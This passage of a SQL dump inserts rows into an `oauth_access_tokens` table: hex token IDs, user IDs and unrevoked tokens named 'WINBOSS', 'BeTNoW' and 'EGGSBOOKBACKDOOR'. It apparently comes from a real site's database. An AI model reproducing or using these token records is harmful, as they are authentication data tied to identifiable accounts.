('a894a7faaaca555a60d7d0f7badcf3b6d60531bf8d41eca276e385343e6216a0a0f396ee2c0156ff', '450280', 5, 'WINBOSS', '[]', 0, '2022-07-19 03:17:09', '2022-07-19 03:17:09', '2023-07-19 03:17:09'),
('a8c1d980bbeab69fa5a64d6ac5961645a802715c93741e6f7a4de41c4c3a4a75dec35c71736914d3', '694217', 5, 'WINBOSS', '[]', 0, '2023-01-13 13:40:49', '2023-01-13 13:40:49', '2024-01-13 13:40:49'),
('a8efaeb0736797db28401cd6b685d0263bd3627a8837420c7a946891cc385d643705b04c454eed22', '513994', 5, 'WINBOSS', '[]', 0, '2023-04-12 16:49:31', '2023-04-12 16:49:31', '2024-04-12 16:49:31'),
('a98e32dc3a28581cad97821827fafc827c46e4210bf323d2edf08c227354085165e1805ce7b47968', '222825', 5, 'WINBOSS', '[]', 0, '2023-07-23 05:27:05', '2023-07-23 05:27:05', '2024-07-23 05:27:05'),
('a996f98d65044d4bca9ca0d7edbb10d4908b87efc34cf6114f63d92d4799978b28a61045cffdf382', '181803', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:20:00', '2022-06-28 08:20:00', '2023-06-28 08:20:00'),
('a9dd53c5dd9ddba09ea3d984ce1eacfbee31818915f2342655e94747fc0f51bf0459ea423b433498', '954812', 5, 'WINBOSS', '[]', 0, '2023-04-12 11:26:44', '2023-04-12 11:26:44', '2024-04-12 11:26:44'),
('aa03245dc4ede009a77e9b66bab749d34297d7088daea5215e6e5f77d3829b412f5b552c4d030bf4', '532763', 5, 'WINBOSS', '[]', 0, '2023-07-25 10:31:28', '2023-07-25 10:31:28', '2024-07-25 10:31:28'),
('aa8f69e88f3974217248cf5de5360555a26607357ceb938680d7120bb7a860f62957e951f0456338', '280710', 5, 'WINBOSS', '[]', 0, '2023-09-29 09:41:21', '2023-09-29 09:41:21', '2024-09-29 09:41:21'),
('aaabf09eebb14460ff3e201633efec5c77887a3d82b7bf0193b4881b070c8a3a27e152e85fbaeded', '610713', 5, 'WINBOSS', '[]', 0, '2024-01-17 18:09:51', '2024-01-17 18:09:51', '2025-01-17 18:09:51'),
('aacd71d0520654e75ed3b717a4daaec2988616412fbf005310df4d9395f3290063c3a155bdfd57eb', '920591', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-12-30 06:25:17', '2023-12-30 06:25:17', '2024-12-30 06:25:17'),
('aad879068cfe1b9b369ac1410e195244b42f1e7809152aac1f020e1b7940a204fb114162f25666fe', '106950', 5, 'WINBOSS', '[]', 0, '2022-12-15 11:06:16', '2022-12-15 11:06:16', '2023-12-15 11:06:16'),
('ab1bb70e70a69873834169a60bab8ebabc73bcd75d95fd037b66749ea232da945155f5188161bccb', '542788', 5, 'WINBOSS', '[]', 0, '2022-07-18 08:50:47', '2022-07-18 08:50:47', '2023-07-18 08:50:47'),
('ab4783ddd55e59256f6a8d0a481644bfccad29a9400b033b5f8377effc96962f75bdcf2510942e47', '755261', 5, 'WINBOSS', '[]', 0, '2023-04-09 10:28:14', '2023-04-09 10:28:14', '2024-04-09 10:28:14'),
('ab4b578e0114b16edce0addccee1f1768b0c92000062b288f60f4f26e1f9c30a152c2ef5fda1d618', '226367', 5, 'WINBOSS', '[]', 0, '2022-11-26 04:15:21', '2022-11-26 04:15:21', '2023-11-26 04:15:21'),
('ab76f72fe63d2c9ab4c17baf270fd61202a7858914e7d4e9c7b2ac100210ca38362dd24b972dcdb8', '344253', 5, 'WINBOSS', '[]', 0, '2022-11-29 15:05:27', '2022-11-29 15:05:27', '2023-11-29 15:05:27'),
('ab7daf6335af99a10c33b0fb217310b8f84176556aff87b3d75b3ec9288e3cb2a4e3caab4d40350b', '942192', 5, 'WINBOSS', '[]', 0, '2023-11-09 08:10:23', '2023-11-09 08:10:23', '2024-11-09 08:10:23'),
('ab90c55b92198d00530bbd8a5b366ee3ee9c277582ae3c349803770df38036a6cccee6c8bc689717', '468860', 5, 'WINBOSS', '[]', 0, '2023-04-24 15:13:56', '2023-04-24 15:13:56', '2024-04-24 15:13:56'),
('abe6ec5cb9420a05d24b2f7f1f8d3ab41e100a150ec6d833a340d805ac1358fddc264ddebf0b973f', '965917', 5, 'WINBOSS', '[]', 0, '2022-12-21 13:17:07', '2022-12-21 13:17:07', '2023-12-21 13:17:07'),
('ac1533166475ed0c66f1c4cbef2a20049f5484cf82233f191d4f2378abc207d1e0972c9c1e61d742', '801344', 5, 'WINBOSS', '[]', 0, '2023-06-29 14:29:24', '2023-06-29 14:29:24', '2024-06-29 14:29:24'),
('ac228a708556e4f8a64d57ff67a7f338555a8c73b673e343b48bddb4983a5d1fda5a39a2d6dfccf6', '492376', 5, 'WINBOSS', '[]', 0, '2022-12-30 02:13:50', '2022-12-30 02:13:50', '2023-12-30 02:13:50'),
('ac2955ff0a8457aedf64b93f7fb1284101e0264541d1f96b1dced365ff36df8f1e3c8f5faf4f8c8f', '573320', 5, 'WINBOSS', '[]', 0, '2023-09-09 16:58:36', '2023-09-09 16:58:36', '2024-09-09 16:58:36'),
('ace02272226e8ea4217b4321df7e56e87a2c52ccb5405170e3df771d6918b22c4fb8f9c965293fe8', '612339', 5, 'WINBOSS', '[]', 0, '2022-07-08 05:06:16', '2022-07-08 05:06:16', '2023-07-08 05:06:16'),
('acea32660ebaa91edf1b2d86793eaad3256e4459ce056e2d4a6db556af32ef87f8b6eb4005e70550', '748727', 5, 'WINBOSS', '[]', 0, '2022-12-10 13:17:34', '2022-12-10 13:17:34', '2023-12-10 13:17:34'),
('ad0a6a7e363079f277147867bcd823af7c242cfacd016f41cd031871a69cee50cfb1ae5b558a5796', '180499', 5, 'WINBOSS', '[]', 0, '2023-01-05 13:28:10', '2023-01-05 13:28:10', '2024-01-05 13:28:10'),
('ad1d61fa657c986e1504498a61739aff7853648a90a402e56a1fbf4ec49143443f0310121c5ebdeb', '386021', 5, 'WINBOSS', '[]', 0, '2024-01-19 14:57:39', '2024-01-19 14:57:39', '2025-01-19 14:57:39'),
('ad6bc698b16ed34824b276e8448239a671615f56f5f2abdae3a8cf30d30d7bb6f5eea8c036813b4d', '777879', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:17:08', '2022-06-28 08:17:08', '2023-06-28 08:17:08'),
('ad7a2631bc9a133e274ee2c56197f920ccaec9bd7f7fa7fa9fd50600d62e60f5114878ba7b948f4d', '952274', 5, 'WINBOSS', '[]', 0, '2023-09-01 20:14:33', '2023-09-01 20:14:33', '2024-09-01 20:14:33'),
('ad8a3efaea9a2d09cc4a86f0e52773f6c26ef023a6083e431dbb7ca236bde7a51731696a9bbb38f1', '227751', 5, 'WINBOSS', '[]', 0, '2023-10-21 23:49:31', '2023-10-21 23:49:31', '2024-10-21 23:49:31'),
('ad9daf9fd7f1606a9a6f88729998df7136ec72f01093f94f73dd3e3c462fa8f1ae107fcd7f8c88c5', '732616', 5, 'WINBOSS', '[]', 0, '2022-10-09 17:11:34', '2022-10-09 17:11:34', '2023-10-09 17:11:34'),
('adde197c0444f76dca0f44aef08bf582d4b14a41f20602f05fa3c40aafbe120baa4adb561c9d237e', '547800', 5, 'WINBOSS', '[]', 0, '2022-12-26 00:25:17', '2022-12-26 00:25:17', '2023-12-26 00:25:17'),
('ae0808f526e4117a2f7eb55454d74a794ee713c8454eb35fded1dea2877481bf601c9700e5422272', '592215', 5, 'WINBOSS', '[]', 0, '2023-07-16 03:56:55', '2023-07-16 03:56:55', '2024-07-16 03:56:55'),
('ae10c7b4cea17fe02e66ddb90169cae720895f6a9b745416a4f6442ac86c16073acac8c5f53d4969', '950473', 5, 'WINBOSS', '[]', 0, '2023-06-08 04:38:11', '2023-06-08 04:38:11', '2024-06-08 04:38:11'),
('ae5cf31b40a5dd00b10fe562aa2d191dc55f219d289c1373712732d2b64e0eabefade3584707f45a', '444099', 5, 'BeTNoW', '[]', 0, '2023-01-30 07:46:19', '2023-01-30 07:46:19', '2024-01-30 07:46:19'),
('ae5e78bf0b300ada403ed5c45383d958e0e27d0e64bb4fdda6746dcebcda6e519fe4e594b2cc4463', '149589', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-05-27 04:15:12', '2023-05-27 04:15:12', '2024-05-27 04:15:12'),
('ae647034f050147c3c54eafb7ae2af8efd76de6301def7dd433ac6da99fe3ccd18891d74134f7fce', '625643', 5, 'WINBOSS', '[]', 0, '2024-01-12 14:31:46', '2024-01-12 14:31:46', '2025-01-12 14:31:46'),
('ae858df28da555e86af4d67a58a92427add064f7f2d984255fcf6f24e738c1f3b7f6fade7c4cd9fc', '115514', 5, 'WINBOSS', '[]', 0, '2022-12-26 00:22:35', '2022-12-26 00:22:35', '2023-12-26 00:22:35'),
('ae8a6d34d6fc2c5cff31fc76c5ed1aee063e4e3e1d214302ad4ceb66504b0a746577a6acc5c0d382', '261438', 5, 'WINBOSS', '[]', 0, '2022-12-26 08:39:26', '2022-12-26 08:39:26', '2023-12-26 08:39:26'),
('aea74d6f57c36f8af6dc10532655f9b8655d6ae0b1488cdcb9995b5b94bc8e7061e18e1ed92da6c9', '911936', 5, 'WINBOSS', '[]', 0, '2022-11-23 14:09:24', '2022-11-23 14:09:24', '2023-11-23 14:09:24'),
('aec9684b212f669ced1ec92ddd33e92575598738822c71f3894df9be2e0d106fd9f0604ff98a5213', '678721', 5, 'WINBOSS', '[]', 0, '2023-11-21 06:44:09', '2023-11-21 06:44:09', '2024-11-21 06:44:09'),
('af0aaf30fd85839c092e553da757d88138636a56a5d3eca8d507b26acdf693b6d5005b1cce28d1b2', '251806', 5, 'WINBOSS', '[]', 0, '2023-11-09 12:00:56', '2023-11-09 12:00:56', '2024-11-09 12:00:56'),
('af2f5f9601b28f06baca6a96fdd5074d4d75293ed5b348fb874913549a09673ce57bccf389e7a3e0', '170020', 5, 'WINBOSS', '[]', 0, '2023-12-31 12:18:24', '2023-12-31 12:18:24', '2024-12-31 12:18:24'),
('af3e06a28fc6e1a9bcecb4776137633557180efe0eb5b0b3c23d2d5910ab4fd6904d56cc98dee6d8', '514990', 5, 'WINBOSS', '[]', 0, '2023-04-03 04:39:16', '2023-04-03 04:39:16', '2024-04-03 04:39:16'),
('af57b4fa4243b9e348fdee9e2061a86cd1cddf6221959ca9f10db4ccd2c7961fc93b4783c50b22f5', '175777', 5, 'WINBOSS', '[]', 0, '2022-12-07 14:12:04', '2022-12-07 14:12:04', '2023-12-07 14:12:04'),
('b01f16321601c1f85d4ff9d9772624f515c8ddda7eedeff6f39b7b688e2be15d28c7ef3f20b2dc12', '172626', 5, 'WINBOSS', '[]', 0, '2023-04-20 06:46:56', '2023-04-20 06:46:56', '2024-04-20 06:46:56'),
('b0410ad47efc8771b49bee3648c3d87cc60b29eb62ec0ef7ab11e36514c7c000d0ea1e8f6366f015', '995691', 5, 'WINBOSS', '[]', 0, '2022-12-12 15:42:44', '2022-12-12 15:42:44', '2023-12-12 15:42:44'),
('b070ef7f2f26df19da5a372a468ab2910f730501103d333cbdcf5257ea7550c6812230b642b0a9d2', '906595', 5, 'WINBOSS', '[]', 0, '2024-01-05 15:19:41', '2024-01-05 15:19:41', '2025-01-05 15:19:41'),
('b080d45b43a4be94c6f75fedddd9047b488d71f789a7af9b1453967b2848d62f3f3752fdadd3b4b8', '271654', 5, 'WINBOSS', '[]', 0, '2022-11-01 02:58:44', '2022-11-01 02:58:44', '2023-11-01 02:58:44'),
('b08463cc5b99c83422ccd0061727ff3920046c895ce1ad7be49e50c6329813d2e24621c1bf57fb2a', '243746', 5, 'WINBOSS', '[]', 0, '2022-07-22 17:57:23', '2022-07-22 17:57:23', '2023-07-22 17:57:23'),
('b0d998667955fa63e61462ac9a5da3285fb5a80287a1c3101364e7065ea596cb8a3fdf2e70aee5c5', '722945', 5, 'WINBOSS', '[]', 0, '2023-10-17 17:21:11', '2023-10-17 17:21:11', '2024-10-17 17:21:11'),
('b0df7a30312ea9bbd3b594077930668b4f451258eff36eb28b984e868b4714ff19eab57e3a2eb814', '687018', 5, 'WINBOSS', '[]', 0, '2023-01-19 16:54:39', '2023-01-19 16:54:39', '2024-01-19 16:54:39'),
('b10115a39005bc6246dd9b8c53bc15fa069334f3535d8c7a8832fb51d3805f78c5d77596e254fbcf', '610903', 5, 'WINBOSS', '[]', 0, '2023-11-02 02:31:00', '2023-11-02 02:31:00', '2024-11-02 02:31:00'),
('b174997dff59cf4e3321ec4d1bec80ddf6c7988674c4fb51d24b0e84434a167d64d779aa872c3a0e', '328126', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-12-30 06:18:58', '2023-12-30 06:18:58', '2024-12-30 06:18:58'),
('b1b25f9fbd7d994a43e4fd2a0ddb77590051deb56f31f984d7785e401558003235b7ddd0e2947cdf', '884406', 5, 'WINBOSS', '[]', 0, '2022-12-26 12:35:35', '2022-12-26 12:35:35', '2023-12-26 12:35:35'),
('b1f768e2aa7a4600bee297d0317735b17b48146c66387573f7d92bcbb1c1e15e6f2da211912559ad', '892393', 5, 'WINBOSS', '[]', 0, '2023-01-14 08:31:33', '2023-01-14 08:31:33', '2024-01-14 08:31:33'),
('b232ff3fdbde7671f3719480027702037bdef13af6dadabd95d4d2837a712ee5a2b00bf99e779008', '644271', 5, 'WINBOSS', '[]', 0, '2023-01-09 08:35:58', '2023-01-09 08:35:58', '2024-01-09 08:35:58'),
('b23d1c2e3279c802c252d34be3e0f75b1814b244a36fadf0db18cfc7b26f6e5b0e336c16463a9454', '830614', 5, 'WINBOSS', '[]', 0, '2023-04-18 07:23:15', '2023-04-18 07:23:15', '2024-04-18 07:23:15'),
('b250466a44e920303a3ba18f809d2a8413a9f2be1e02e811196e8ef55169d0a03c763e71c746fdac', '631667', 5, 'BeTNoW', '[]', 0, '2022-12-13 07:17:19', '2022-12-13 07:17:19', '2023-12-13 07:17:19'),
('b2742184111d38a98e2f624428e5e557b4ec65f9f5cd7b8589fd82a0558e8cf112e304fbe5918d8c', '440242', 5, 'WINBOSS', '[]', 0, '2022-12-25 20:28:05', '2022-12-25 20:28:05', '2023-12-25 20:28:05'),
('b27752e73504897be5fbbae9c96efeadf39b484759f2cd508832e892f823482922348ba4428e00d9', '392556', 5, 'WINBOSS', '[]', 0, '2023-06-20 19:42:52', '2023-06-20 19:42:52', '2024-06-20 19:42:52'),
('b317fb4a4e7cfe31db8e3759fea6919b00781fc73ca76c082ea866a6f84c5810ed90d08d1619a568', '663421', 5, 'WINBOSS', '[]', 0, '2023-05-22 23:30:32', '2023-05-22 23:30:32', '2024-05-22 23:30:32'),
('b360c2d335d103ac7451f171efc53ba17e813440fa13d0faacbf092b17c4aff48a3d5f161ee270ab', '411104', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:02:34', '2024-01-22 04:02:34', '2025-01-22 04:02:34'),
('b3efcb283caab162a619851932e17b1e8845de32bd78332e02cb96b2e5ba50c5415b6ce82097bd97', '155766', 5, 'WINBOSS', '[]', 0, '2023-08-15 08:58:36', '2023-08-15 08:58:36', '2024-08-15 08:58:36'),
('b44ecf089d5630449a09071f0c7f034ef010dbc8ddaa1650b56d95fec410552e40469f70b177f135', '648180', 5, 'WINBOSS', '[]', 0, '2022-12-25 22:31:34', '2022-12-25 22:31:34', '2023-12-25 22:31:34'),
('b46724ca954519fd99b5e11af239bc76b0fb795ec0771dffe81c74b33910c51230947f3e8a7d82a6', '495866', 5, 'WINBOSS', '[]', 0, '2023-07-18 07:23:09', '2023-07-18 07:23:09', '2024-07-18 07:23:09'),
('b46ae68eb2b0304f61f89f0461f09bfca1a40e0b9548645a1898cffc661484ee78e409850aa15868', '213349', 5, 'WINBOSS', '[]', 0, '2022-12-26 15:26:43', '2022-12-26 15:26:43', '2023-12-26 15:26:43'),
('b4864d4e7b44125a317e380ddf4736776fb04f1660e93613d67e265fab6028ccc464a49311385eea', '429837', 5, 'WINBOSS', '[]', 0, '2023-07-12 14:46:03', '2023-07-12 14:46:03', '2024-07-12 14:46:03'),
('b48795672be7806876f6e5817dbb748b05e1664318284666464a9577e3b747c6b28314303da47e45', '216852', 5, 'WINBOSS', '[]', 0, '2023-10-28 07:49:20', '2023-10-28 07:49:20', '2024-10-28 07:49:20'),
('b4b2f1064078368304953431ea10875cedd0ea41a2e3f26148fb03a1ea11cda92ae5779b886fbf5a', '776507', 5, 'WINBOSS', '[]', 0, '2022-12-30 04:23:14', '2022-12-30 04:23:14', '2023-12-30 04:23:14'),
('b4ef47397b51d2cb2c4bf1112cb289fd170f9828294022d560ffe7138ae314395022581a799ba971', '450553', 5, 'WINBOSS', '[]', 0, '2022-12-29 17:52:49', '2022-12-29 17:52:49', '2023-12-29 17:52:49'),
('b573210837260c7ba5115e9e087b0b237b6533175dfb5f0932702e91cb5da2724dc6833e961ef1dc', '541255', 5, 'WINBOSS', '[]', 0, '2023-01-03 19:09:33', '2023-01-03 19:09:33', '2024-01-03 19:09:33'),
('b649c651dd31a64de2fffaf207dc5ff0ad1fefc944d8400ca1e3dc05c2bd3ef76a0ef77c09f11071', '586793', 5, 'WINBOSS', '[]', 0, '2022-12-25 23:12:53', '2022-12-25 23:12:53', '2023-12-25 23:12:53'),
('b655219f449e59e19113e2eb76eb707d3d8a9897926b297c7f2d7e6f48406fc38d6f810f79831f2b', '292462', 5, 'WINBOSS', '[]', 0, '2023-07-30 04:45:23', '2023-07-30 04:45:23', '2024-07-30 04:45:23'),
('b6971329021eab896eb490b05ff1a85b0156c2f4896c98fa27f78578de1ea6f2cbacaf8cfee45fea', '370769', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-07-20 08:49:58', '2022-07-20 08:49:58', '2023-07-20 08:49:58'),
('b6a5b80008707710092a3aadc8269a101ab3a4008355b22165a69f2ec8ede8dd0df431a1fbcdafe4', '891499', 5, 'WINBOSS', '[]', 0, '2023-07-25 02:59:57', '2023-07-25 02:59:57', '2024-07-25 02:59:57'),
('b6a8d71af4e482a0f39fc868203cd62100e5971fae20a08bce405c0a0674f82621fbdb5ff2965a4c', '829547', 5, 'WINBOSS', '[]', 0, '2023-04-18 10:49:12', '2023-04-18 10:49:12', '2024-04-18 10:49:12'),
('b6be460b0cb6904ae0970facc2f331da08129d807ed1d6853a3b2106e967dcfe48da807c3f790686', '914862', 5, 'WINBOSS', '[]', 0, '2023-07-15 05:50:43', '2023-07-15 05:50:43', '2024-07-15 05:50:43'),
('b768d0754053773b0fdcf16712765f580ab32ed19a7ad2e1914d009fda3b7a080fbda02623e9f618', '600915', 5, 'WINBOSS', '[]', 0, '2024-01-19 02:03:37', '2024-01-19 02:03:37', '2025-01-19 02:03:37'),
('b7a33a8f3f6de092846f900eb5219b40aa85899e524bfd69b3bd359b1270a850fc14e6d35b2b35b8', '291503', 5, 'WINBOSS', '[]', 0, '2023-12-07 18:38:41', '2023-12-07 18:38:41', '2024-12-07 18:38:41'),
('b7fee0a6e8c7b5c8fe3a9e73d541efa76cdec4312b44fadcb31c7671f6795d46d2088da345f70042', '806135', 5, 'WINBOSS', '[]', 0, '2022-12-17 10:35:08', '2022-12-17 10:35:08', '2023-12-17 10:35:08'),
('b81dc6fd33292565c8aeaa3fd422b752eeb3844bbe997dcebbea2b71fe2d9eadc5b8c11ccd419e6b', '977432', 5, 'WINBOSS', '[]', 0, '2022-07-19 04:16:14', '2022-07-19 04:16:14', '2023-07-19 04:16:14'),
('b85beb17abab484645a19fcc79fcc42360a006ce20aea84a41dfb718ae17c40da5382cd1a4a097d3', '841739', 5, 'WINBOSS', '[]', 0, '2023-08-28 13:51:58', '2023-08-28 13:51:58', '2024-08-28 13:51:58'),
('b86d619fe38acd986e0d6904ac56162463533db1084f9557d5e93f811bbd84a54a0ab5583266c52d', '559259', 5, 'WINBOSS', '[]', 0, '2022-12-14 09:54:38', '2022-12-14 09:54:38', '2023-12-14 09:54:38'),
('b87abd7d85d0e441e2a9da3fed6f5cb6034e5ebbbe0af4be00af1da26978f4d87b1419629f0dc839', '606068', 5, 'WINBOSS', '[]', 0, '2022-12-15 03:20:45', '2022-12-15 03:20:45', '2023-12-15 03:20:45'),
('b8c06c9df5bf6175447ab2b353e25c126b9a16835243f3c59822e77c7b5bcf22bba1fc2e472165c4', '487117', 5, 'WINBOSS', '[]', 0, '2023-05-30 05:10:02', '2023-05-30 05:10:02', '2024-05-30 05:10:02'),
('b8c5bd8075bfa3275d127ecc8facbdb8e38cc9e9ffdf43f12bea4f930a2778718fddcc9fb1b442c9', '338092', 5, 'WINBOSS', '[]', 0, '2023-01-14 12:12:04', '2023-01-14 12:12:04', '2024-01-14 12:12:04'),
('b8c5bf78f1c2a390ceb296a3b39375c20d74857b2093c664b605f856248c9163920f7fc1b10b5693', '733593', 5, 'WINBOSS', '[]', 0, '2022-10-22 04:21:11', '2022-10-22 04:21:11', '2023-10-22 04:21:11'),
('b8da78733093ff73852d8fd8e1289802a2577cb44a71fda1b66ffc761246b6db060d4797ff0c1dbb', '829234', 5, 'BeTNoW', '[]', 0, '2022-12-16 04:09:20', '2022-12-16 04:09:20', '2023-12-16 04:09:20'),
('b91a4f75d77a46e84e374ac6313c635ce8cb0b78c8dcae2dcfea2f762f3bf81bfd1589503e9825d2', '854477', 5, 'WINBOSS', '[]', 0, '2023-11-05 07:16:06', '2023-11-05 07:16:06', '2024-11-05 07:16:06'),
('b9460d75c826075328e4580753aafea56815dc0a0f7521dfea549ed20e3c7af21651d63229c7f055', '319435', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:09:27', '2022-09-01 05:09:27', '2023-09-01 05:09:27'),
('b9675a80050b310899b669dfb176aeb40293854477cec1454d1df7309efd6a9306bf27ac925e9ce7', '940548', 5, 'WINBOSS', '[]', 0, '2023-10-23 14:29:38', '2023-10-23 14:29:38', '2024-10-23 14:29:38'),
('b9901631457641beeb162da397613b165d4f8332944fe4808cf5e265aa6aaf4a69be467d83e9d29c', '624391', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:25:13', '2022-06-28 08:25:13', '2023-06-28 08:25:13'),
('b9e57ba24970d244975aeedfe0791039888c035fa0b17665101856536f82d6416e78024fb8517d68', '769368', 5, 'WINBOSS', '[]', 0, '2022-08-06 03:49:16', '2022-08-06 03:49:16', '2023-08-06 03:49:16'),
('ba01c7d7fea928ab59c66905cd3502c0380bd9c80455d52f95b574938ab3f4d8b321199edb8614e2', '136179', 5, 'WINBOSS', '[]', 0, '2023-03-01 16:29:51', '2023-03-01 16:29:51', '2024-03-01 16:29:51'),
('ba4b13ef6462a50ad1789748e01b23dcab7514865acf4f5ff62f93c9ec0f9d7f664173b81396d531', '805168', 5, 'WINBOSS', '[]', 0, '2022-12-10 13:38:28', '2022-12-10 13:38:28', '2023-12-10 13:38:28'),
('ba8e9b8903ed2556b3c68337fef6bc0c6d62527ac8b76135f62fbec37a95782ba150df97aa5a210e', '837655', 5, 'WINBOSS', '[]', 0, '2022-09-12 06:08:15', '2022-09-12 06:08:15', '2023-09-12 06:08:15'),
('bab5a41e6aa125294bebb439129c36648b5bff16e0d8c2e325df73ac3069915a063ba5534cd53154', '506273', 5, 'WINBOSS', '[]', 0, '2023-01-20 16:32:09', '2023-01-20 16:32:09', '2024-01-20 16:32:09'),
('baead704b1cfe1afcd07aba854938fe12ad167d29224a26a54264a074fc5c961b70d17ddc23cfe5f', '950669', 5, 'WINBOSS', '[]', 0, '2023-01-13 03:57:09', '2023-01-13 03:57:09', '2024-01-13 03:57:09'),
('bb0a13d7f84f93900e8cf38d6b192e99faac84b6e3e29496b0a2e4d77da85793f228ff50cd935118', '396496', 5, 'WINBOSS', '[]', 0, '2023-05-31 05:43:55', '2023-05-31 05:43:55', '2024-05-31 05:43:55'),
('bb39829771a1cd71cbe42a64c3ff8149d9fc77effd8f2c0aca19b3a0176be86859127cdfd8737de6', '864463', 5, 'WINBOSS', '[]', 0, '2023-11-21 08:26:44', '2023-11-21 08:26:44', '2024-11-21 08:26:44'),
('bb5197e87943f3e215d5e2d05ef412d6c36f5d56acd66e02796a21e0d9064cf23a870ee60a748452', '337943', 5, 'WINBOSS', '[]', 0, '2022-12-26 18:18:55', '2022-12-26 18:18:55', '2023-12-26 18:18:55'),
('bb5f2a989d7646e91f998df66830327db5b950288af9f48273da0a9612073986e99e5b8bc66e637e', '622227', 5, 'WINBOSS', '[]', 0, '2023-05-17 10:52:52', '2023-05-17 10:52:52', '2024-05-17 10:52:52'),
('bb632d50942580cd6439c2b688051f97f0fe82cd2cf4a3440f29c111baa1627cb56c204d4275b832', '720028', 5, 'WINBOSS', '[]', 0, '2022-12-25 19:27:40', '2022-12-25 19:27:40', '2023-12-25 19:27:40'),
('bb9fe89bc687e259dd491d0de95c9d518f911a323c88f3f9e8b088c2e9e206040f7c936fd03b23f7', '373974', 5, 'WINBOSS', '[]', 0, '2023-01-04 14:36:42', '2023-01-04 14:36:42', '2024-01-04 14:36:42'),
('bbbbe5e8350d52f334274c08c587fae631edc1b6008ad9e9d6112e6f167ebe3427c323bf1acf9a42', '979127', 5, 'WINBOSS', '[]', 0, '2023-11-14 08:06:28', '2023-11-14 08:06:28', '2024-11-14 08:06:28'),
('bbc803bde75cdac55708dbad4cd68ffe44e9187eae56c2553b8763c050ae7b5b0b20934b3797dcd7', '152805', 5, 'WINBOSS', '[]', 0, '2023-08-25 09:49:19', '2023-08-25 09:49:19', '2024-08-25 09:49:19'),
('bbedb44a9df78dc06b067704de39cee952522aefc46145b28656fe01101c293c3adfdad75693f561', '971749', 5, 'WINBOSS', '[]', 0, '2023-06-13 09:22:36', '2023-06-13 09:22:36', '2024-06-13 09:22:36'),
('bc0a157644c309b4567a86b8795a1261fff1c689b512e2cb455b1192e90aa036fedbf4db8fcc54fb', '128840', 5, 'WINBOSS', '[]', 0, '2023-08-31 05:45:52', '2023-08-31 05:45:52', '2024-08-31 05:45:52'),
('bc56f0351ea652a157706452deb1f13660f548e2e827b311cf7d5ada02fa1459b261514bf6519807', '887599', 5, 'WINBOSS', '[]', 0, '2024-01-19 10:23:04', '2024-01-19 10:23:04', '2025-01-19 10:23:04');
INSERT INTO `oauth_access_tokens` (`id`, `user_id`, `client_id`, `name`, `scopes`, `revoked`, `created_at`, `updated_at`, `expires_at`) VALUES
('bc57f1668270a873318ecf94b5aed05dd920949138bf4dfaeb685dd637e232b2b2ac7e0ff1fd5147', '593783', 5, 'WINBOSS', '[]', 0, '2022-11-18 03:19:50', '2022-11-18 03:19:50', '2023-11-18 03:19:50'),
('bc6a67821f6c30f8b92167d05ceecffab81399cf341985f83477b27532ef4d736e2f2ab25bf6d891', '580615', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-11-08 04:26:49', '2023-11-08 04:26:49', '2024-11-08 04:26:49'),
('bc866cf8e66c82799969b8148391d35cbc33bd1a3187b19a0ae50c72182e6c4482ea016f6c0b8c2b', '430163', 5, 'WINBOSS', '[]', 0, '2023-04-27 11:20:12', '2023-04-27 11:20:12', '2024-04-27 11:20:12'),
('bc9dfc036074727eeb55e54de277d3fc337ae491bf6d72ff9081181086ef1e569fb19e0793b44ec9', '190423', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-21 10:26:10', '2022-11-21 10:26:10', '2023-11-21 10:26:10'),
('bd261dcdc7efdd5b53dc2df438e4fa6dfcff1af20aa875df677ff410f607b28cafabe53160aed6cb', '488217', 5, 'WINBOSS', '[]', 0, '2022-12-25 23:30:34', '2022-12-25 23:30:34', '2023-12-25 23:30:34'),
('bd4a1a4961bfbc45a7ae9bea05322cf99385dd0e7982f8a744953a14cdcedf8fec0fcd631bdf88ad', '760547', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:36:33', '2024-01-22 04:36:33', '2025-01-22 04:36:33'),
('bd4cb2c97498a5734d21576d33cfa2398f4eb47153554979d1ca8292a242e3f72b7225a83a01a1b0', '602880', 5, 'WINBOSS', '[]', 0, '2022-08-16 06:17:33', '2022-08-16 06:17:33', '2023-08-16 06:17:33'),
('bd8070aa01c08cd8c371f0456619c5e9f317b53d37e4fb4c3049628e128fd43faedd055778bf716c', '533906', 5, 'WINBOSS', '[]', 0, '2023-11-13 07:21:33', '2023-11-13 07:21:33', '2024-11-13 07:21:33'),
('bd8e81c7968d65ce540d327945275032856337e7ea64dc2149a421b311bdcc84acf1441daf36349d', '956868', 5, 'WINBOSS', '[]', 0, '2023-04-05 02:10:10', '2023-04-05 02:10:10', '2024-04-05 02:10:10'),
('bd94784bf2d6723a5f46cf85069cdd8a241737a305b075942a0488df7ab97acf45261016b442e719', '628522', 5, 'WINBOSS', '[]', 0, '2023-06-23 03:31:41', '2023-06-23 03:31:41', '2024-06-23 03:31:41'),
('bdba26fd1de5fb68d6646fcae013a4ff317b5cc5fde81e8f259eb410c9a7a0db01ac4f1976fb49e4', '535327', 5, 'BeTNoW', '[]', 0, '2022-07-23 08:05:38', '2022-07-23 08:05:38', '2023-07-23 08:05:38'),
('bdf3b0fd38487060621aa058feda1e1be8cea156db06d7788dbadb0d55cf49e0e0093bce38bab127', '802474', 5, 'WINBOSS', '[]', 0, '2022-12-15 03:46:24', '2022-12-15 03:46:24', '2023-12-15 03:46:24'),
('bdfe6ab1d20da2cafbea801b3eb90ff0ac3c2b737751707aa26e39c00622b18ea11ec05955f15029', '907822', 5, 'WINBOSS', '[]', 0, '2024-01-19 03:15:35', '2024-01-19 03:15:35', '2025-01-19 03:15:35'),
('be0f901bd492c788e30f8e07ed91e093977a8635d661f33279b15ab1cb102c9f4fa41ec8ba637bcc', '374646', 5, 'WINBOSS', '[]', 0, '2023-05-31 05:45:54', '2023-05-31 05:45:54', '2024-05-31 05:45:54'),
